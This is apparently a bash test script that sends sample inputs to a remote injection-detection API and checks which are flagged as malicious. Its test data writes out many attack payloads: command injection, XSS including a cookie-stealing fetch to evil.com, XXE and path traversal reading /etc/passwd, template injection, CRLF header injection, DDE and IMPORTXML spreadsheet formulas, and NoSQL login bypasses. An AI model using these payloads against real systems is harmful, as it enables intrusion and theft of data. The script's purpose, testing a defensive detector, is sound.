#!/bin/bash

API_URL="https://blaze-inject-guard.fly.dev"
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
LOG_FILE="remote_test_results_${TIMESTAMP}.log"

# Function to run a test and print the result
run_test() {
    local endpoint=$1
    local payload=$2
    local description=$3
    local expected_malicious=$4

    echo "Testing $description..."
    echo "Testing $description..." >> $LOG_FILE
    
    # Added -k to bypass SSL verification issues if needed
    response=$(curl -s -k -X POST "$API_URL$endpoint" -H "Content-Type: application/json" -d "$payload")
    
    # Log the full response for debugging
    echo "Response: $response" >> $LOG_FILE
    
    is_malicious=$(echo $response | grep -o '"is_malicious":true')
    
    if [[ ! -z "$is_malicious" && "$expected_malicious" == "true" ]]; then
        echo "TEST PASSED: Successfully detected malicious input"
        echo "TEST PASSED: Successfully detected malicious input" >> $LOG_FILE
    elif [[ -z "$is_malicious" && "$expected_malicious" == "false" ]]; then
        echo "TEST PASSED: Successfully detected safe input"
        echo "TEST PASSED: Successfully detected safe input" >> $LOG_FILE
    else
        echo "TEST FAILED: Expected malicious=$expected_malicious, got response=$response"
        echo "TEST FAILED: Expected malicious=$expected_malicious, got response=$response" >> $LOG_FILE
    fi
    
    # Add a small delay to avoid overwhelming the server
    sleep 0.5
}

# Function to test the comprehensive endpoint
test_comprehensive() {
    local input=$1
    local description=$2
    
    echo "Testing comprehensive analysis for: $description..."
    echo "Testing comprehensive analysis for: $description..." >> $LOG_FILE
    
    response=$(curl -s -k -X POST "$API_URL/detect/comprehensive" -H "Content-Type: application/json" -d "{\"content\": \"$input\"}")
    
    # Log the full response for debugging
    echo "Comprehensive Response: $response" >> $LOG_FILE
    
    # Pretty print the JSON response
    echo "Results:"
    echo "$response" | jq '.'
    
    # Log formatted results
    echo "Results:" >> $LOG_FILE
    echo "$response" | jq '.' >> $LOG_FILE
    
    echo "----------------------------------------"
    echo "----------------------------------------" >> $LOG_FILE
    
    sleep 1
}

# Function to test batch detection
test_batch() {
    echo -e "\n=== BATCH DETECTION TESTS ===" | tee -a $LOG_FILE
    
    # Test payload with multiple inputs and selected detectors
    local payload='{
        "contents": [
            "Hello World",
            "Hello; ls -la",
            "<script>alert(1)</script>",
            "{{7*7}}",
            "../../../etc/passwd"
        ],
        "detectors": {
            "command_injection": true,
            "xss": true,
            "template_injection": true,
            "path_traversal": true,
            "csv_injection": false,
            "redos": false,
            "nosql_injection": false,
            "log_injection": false,
            "ldap_injection": false,
            "xml_injection": false,
            "html_injection": false,
            "header_injection": false
        }
    }'
    
    echo "Testing batch detection with multiple inputs..."
    echo "Testing batch detection with multiple inputs..." >> $LOG_FILE
    
    response=$(curl -s -k -X POST "$API_URL/detect/batch" -H "Content-Type: application/json" -d "$payload")
    
    # Log the full response for debugging
    echo "Batch Response:" | tee -a $LOG_FILE
    echo "$response" | jq '.' | tee -a $LOG_FILE
    
    echo "----------------------------------------" | tee -a $LOG_FILE
}

echo "Starting tests against $API_URL at $(date)" | tee -a $LOG_FILE
echo "Results will be logged to $LOG_FILE" | tee -a $LOG_FILE

# Test the comprehensive endpoint with various inputs
echo -e "\n=== COMPREHENSIVE ENDPOINT TESTS ===" | tee -a $LOG_FILE
test_comprehensive "Hello World" "Safe input"
test_comprehensive "Hello; ls -la" "Command injection attempt"
test_comprehensive "<script>alert(1)</script>" "XSS attempt"
test_comprehensive "{{7*7}}" "Template injection attempt"
test_comprehensive "../../../etc/passwd" "Path traversal attempt"
test_comprehensive "=SUM(A1:B1)" "CSV injection attempt"
test_comprehensive "(a+)+b" "ReDoS attempt"
test_comprehensive "{\"$gt\": \"\"}" "NoSQL injection attempt"
test_comprehensive "username%0d%0aUser logged out" "Log injection attempt"

# Command Injection Tests
echo "=== COMMAND INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/command" '{"content": "Hello World"}' "command injection with safe input" "false"
run_test "/detect/command" '{"content": "Hello; ls -la"}' "command injection with semicolon" "true"
run_test "/detect/command" '{"content": "Hello && ls -la"}' "command injection with &&" "true"
run_test "/detect/command" '{"content": "Hello || ls -la"}' "command injection with ||" "true"
run_test "/detect/command" '{"content": "Hello | ls -la"}' "command injection with pipe" "true"
run_test "/detect/command" '{"content": "Hello `ls -la`"}' "command injection with backticks" "true"
run_test "/detect/command" '{"content": "Hello $(ls -la)"}' "command injection with $()" "true"

# XSS Tests
echo -e "\n=== XSS TESTS ===" | tee -a $LOG_FILE
run_test "/detect/xss" '{"content": "Hello World"}' "XSS with safe input" "false"
run_test "/detect/xss" '{"content": "<script>alert(1)</script>"}' "XSS with script tag" "true"
run_test "/detect/xss" '{"content": "<img src=x onerror=alert(1)>"}' "XSS with event handler" "true"
run_test "/detect/xss" '{"content": "javascript:alert(1)"}' "XSS with javascript: protocol" "true"
run_test "/detect/xss" '{"content": "<a href=javascript:alert(1)>click me</a>"}' "XSS with javascript: in href" "true"

# LDAP Injection Tests
echo -e "\n=== LDAP INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/ldap" '{"content": "John Doe"}' "LDAP injection with safe input" "false"
run_test "/detect/ldap" '{"content": ")(|(cn=*)"}' "LDAP injection with filter bypass" "true"
run_test "/detect/ldap" '{"content": "*)(uid=*))(|(uid=*"}' "LDAP injection with wildcard" "true"
run_test "/detect/ldap" '{"content": "cn=admin,dc=example,dc=com"}' "LDAP injection with DN" "true"

# XML Injection Tests
echo -e "\n=== XML INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/xml" '{"content": "Hello World"}' "XML injection with safe input" "false"
run_test "/detect/xml" '{"content": "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"}' "XML injection with XXE" "true"
run_test "/detect/xml" '{"content": "<![CDATA[<script>alert(1)</script>]]>"}' "XML injection with CDATA" "true"
run_test "/detect/xml" '{"content": "<?xml version=\"1.0\"?>"}' "XML injection with XML declaration" "true"

# Template Injection Tests
echo -e "\n=== TEMPLATE INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/template" '{"content": "Welcome to our website!"}' "Template injection with safe input" "false"
run_test "/detect/template" '{"content": "{{7*7}}"}' "Template injection with expression" "true"
run_test "/detect/template" '{"content": "${7*7}"}' "Template injection with dollar expression" "true"
run_test "/detect/template" '{"content": "<%= File.open(\"/etc/passwd\").read %>"}' "Template injection with ERB" "true"
run_test "/detect/template" '{"content": "{% for x in (1..10) %}{% endfor %}"}' "Template injection with for loop" "true"
run_test "/detect/template" '{"content": "{{config.__class__.__init__.__globals__}}"}' "Template injection with Python globals" "true"

# HTML Injection Tests
echo -e "\n=== HTML INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/html" '{"content": "<p>This is <b>bold</b> text</p>"}' "HTML injection with safe input" "false"
run_test "/detect/html" '{"content": "<div style=\"position:absolute;top:0;left:0;width:100%;height:100%;background:#FFF\">Fake content</div>"}' "HTML injection with overlay" "true"
run_test "/detect/html" '{"content": "<iframe src=\"https://evil.com/phishing\"></iframe>"}' "HTML injection with dangerous tags" "true"
run_test "/detect/html" '{"content": "<div style=\"visibility:hidden\">Hidden content</div>"}' "HTML injection with content hiding" "true"
run_test "/detect/html" '{"content": "<img src=\"x\" onerror=\"fetch(\\\"https://evil.com/steal\\\"+document.cookie)\">"}' "HTML injection with event handlers" "true"

# Path Traversal Tests
echo -e "\n=== PATH TRAVERSAL TESTS ===" | tee -a $LOG_FILE
run_test "/detect/path" '{"content": "images/profile.jpg"}' "Path traversal with safe input" "false"
run_test "/detect/path" '{"content": "../../../etc/passwd"}' "Path traversal with relative path" "true"
run_test "/detect/path" '{"content": "..%2f..%2f..%2fetc%2fpasswd"}' "Path traversal with encoded traversal" "true"
run_test "/detect/path" '{"content": "file:///etc/passwd"}' "Path traversal with file protocol" "true"
run_test "/detect/path" '{"content": "index.php%00.jpg"}' "Path traversal with null byte" "true"

# Header Injection Tests
echo -e "\n=== HEADER INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/header" '{"content": "Normal header value"}' "Header injection with safe input" "false"
run_test "/detect/header" '{"content": "foo\r\nSet-Cookie: session=hijacked"}' "Header injection with CRLF" "true"
run_test "/detect/header" '{"content": "foo%0d%0aSet-Cookie: session=hijacked"}' "Header injection with encoded CRLF" "true"
run_test "/detect/header" '{"content": "foo\r\nAuthorization: Bearer fake_token"}' "Header injection with authorization header" "true"
run_test "/detect/header" '{"content": "foo\r\nContent-Security-Policy: connect-src *"}' "Header injection with CSP modification" "true"

# CSV Injection Tests
echo -e "\n=== CSV INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/csv" '{"content": "Normal text value"}' "CSV injection with safe input" "false"
run_test "/detect/csv" '{"content": "42"}' "CSV injection with numeric input" "false"
run_test "/detect/csv" '{"content": "=HYPERLINK(\"https://evil.com\",\"Click here\")"}' "CSV injection with HYPERLINK formula" "true"
run_test "/detect/csv" '{"content": "=1+2"}' "CSV injection with simple formula" "true"
run_test "/detect/csv" '{"content": "=SUM(A1:B1)"}' "CSV injection with SUM function" "true"
run_test "/detect/csv" '{"content": "@SUM(1:3)"}' "CSV injection with legacy Lotus formula" "true"
run_test "/detect/csv" '{"content": "=IMPORTXML(\"https://evil.com\", \"//secrets\")"}' "CSV injection with Google Sheets function" "true"
run_test "/detect/csv" '{"content": "=DDE(\"cmd\", \"/c calc\", \"1\")"}' "CSV injection with DDE command" "true"
run_test "/detect/csv" '{"content": "=Sheet1!A1"}' "CSV injection with sheet reference" "true"
run_test "/detect/csv" '{"content": "=\"=\"&\"HYPERLINK(\"\"https://evil.com\"\",\"\"Click here\"\")\""}' "CSV injection with obfuscated formula" "true"

# ReDoS Injection Tests
echo -e "\n=== REDOS INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/redos" '{"content": "Hello, world!"}' "ReDoS with safe input" "false"
run_test "/detect/redos" '{"content": "user@example.com"}' "ReDoS with normal email" "false"
run_test "/detect/redos" '{"content": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}' "ReDoS with long repetition and boundary" "true"
run_test "/detect/redos" '{"content": "(a+)+b"}' "ReDoS with nested repetition pattern" "true"
run_test "/detect/redos" '{"content": "(foo|bar|baz|qux)+quux"}' "ReDoS with alternation and repetition" "true"
run_test "/detect/redos" '{"content": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@bbbbbbbbbbbbbbbbbbbbbbbbbbbbb.com"}' "ReDoS with long email pattern" "true"
run_test "/detect/redos" '{"content": "https://aaaaaaaaaaaaaaaaaa.com/bbbbbbbbbb/cccccccccc/dddddddddd/eeeeeeeeee/ffffffffff"}' "ReDoS with long URL pattern" "true"
run_test "/detect/redos" '{"content": "abababababababababababababababababababababababababababababababababab"}' "ReDoS with repeating pattern" "true"
run_test "/detect/redos" '{"content": "(.*a){20}"}' "ReDoS with problematic regex pattern" "true"
run_test "/detect/redos" '{"content": "((ab)+)+c"}' "ReDoS with multiple nested groups" "true"

# NoSQL Injection Tests
echo -e "\n=== NOSQL INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/nosql" '{"content": "John Doe"}' "NoSQL injection with safe input" "false"
run_test "/detect/nosql" '{"content": "123456"}' "NoSQL injection with numeric input" "false"
run_test "/detect/nosql" '{"content": "{\"$gt\": \"\"}"}' "NoSQL injection with $gt operator" "true"
run_test "/detect/nosql" '{"content": "{\"username\": {\"$ne\": null}}"}' "NoSQL injection with $ne operator" "true"
run_test "/detect/nosql" '{"content": "{\"password\": {\"$exists\": false}}"}' "NoSQL injection with $exists operator" "true"
run_test "/detect/nosql" '{"content": "{\"$where\": \"this.password == \\\"password\\\"\"}"}' "NoSQL injection with $where operator" "true"
run_test "/detect/nosql" '{"content": "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}"}' "NoSQL injection bypass authentication" "true"
run_test "/detect/nosql" '{"content": "{\"$or\":[{\"username\":\"admin\"},{\"isAdmin\":true}]}"}' "NoSQL injection with $or operator" "true"
run_test "/detect/nosql" '{"content": "username[$ne]=null"}' "NoSQL injection in URL parameter format" "true"
run_test "/detect/nosql" '{"content": "{\"username\":{\"$regex\":\"^admin\", \"$options\":\"i\"}}"}' "NoSQL injection with regex operator" "true"

# Log Injection Tests
echo -e "\n=== LOG INJECTION TESTS ===" | tee -a $LOG_FILE
run_test "/detect/log" '{"content": "Normal user message"}' "Log injection with safe input" "false"
run_test "/detect/log" '{"content": "User John Doe"}' "Log injection with user prefix but safe" "false"
run_test "/detect/log" '{"content": "username%0d%0aUser logged out%0d%0aadmin logged in"}' "Log injection with CRLF and fake entries" "true"
run_test "/detect/log" '{"content": "username\nINFO: User password changed"}' "Log injection with newline and log level" "true"
run_test "/detect/log" '{"content": "normal input%0A[ERROR] 2023-04-01 12:34:56 System breach detected"}' "Log injection with timestamp and error" "true"
run_test "/detect/log" '{"content": "user=admin\\nuser=attacker"}' "Log injection with escaped newline" "true"
run_test "/detect/log" '{"content": "14:30:45 | User authenticated successfully"}' "Log injection with time and pipe" "true"
run_test "/detect/log" '{"content": "username%0A{\"level\":\"error\",\"msg\":\"Security alert\"}"}' "Log injection with JSON log format" "true"
run_test "/detect/log" '{"content": "username\\r\\n2023-05-01 - Admin privileges granted"}' "Log injection with date and admin action" "true"
run_test "/detect/log" '{"content": "username%0D%0AWARNING: Account credentials changed"}' "Log injection with warning level" "true"

# Added Health Check
echo -e "\n=== HEALTH CHECK ===" | tee -a $LOG_FILE
health_response=$(curl -s -k "$API_URL/health")
echo "Health check response: $health_response" | tee -a $LOG_FILE

# Run the batch tests after other tests
test_batch

# Summary
echo -e "\nAll tests completed at $(date)!" | tee -a $LOG_FILE
echo "Results have been logged to $LOG_FILE" | tee -a $LOG_FILE
